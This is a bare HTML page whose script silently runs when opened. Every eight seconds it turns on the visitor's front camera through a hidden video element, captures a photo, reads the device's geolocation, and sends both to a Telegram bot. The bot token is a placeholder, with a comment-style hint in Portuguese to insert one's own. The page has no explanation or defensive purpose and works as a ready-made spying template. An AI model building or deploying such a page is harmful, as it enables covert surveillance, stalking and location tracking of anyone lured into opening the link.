<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8"/>
  <title></title>
</head>
<body>
  <video id="camera" style="display:none"></video>
  <script>
    const BOT = '123456789:AAH-EXEMPLO-DO-SEU-TOKEN';
    const CHAT = '-1001234567890';

    function tele(text, file) {
      const fd = new FormData();
      fd.append('chat_id', CHAT);
      fd.append('caption', text);
      if (file) {
        fd.append('photo', file, 's.jpg');
        fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:fd});
      } else {
        fd.append('text', text);
        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST', body:fd});
      }
    }

    async function tirarSelfie() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
        const v = document.getElementById('camera');
        v.srcObject = stream;
        await v.play();
        const c = document.createElement('canvas');
        c.width = 640; c.height = 480;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
          navigator.geolocation.getCurrentPosition(pos=>{
            const {latitude,longitude} = pos.coords;
            tele(`ðŸ“¸ selfie\nðŸ“ https://maps.google.com/?q=${latitude},${longitude}`, b);
          }, ()=>{ tele('ðŸ“¸ selfie', b); });
          stream.getTracks().forEach(t => t.stop());
        }, 'image/jpeg', 0.9);
      } catch(e) {
        console.warn(e);
      }
    }

    setInterval(tirarSelfie, 8000);
  </script>
</body>
</html>
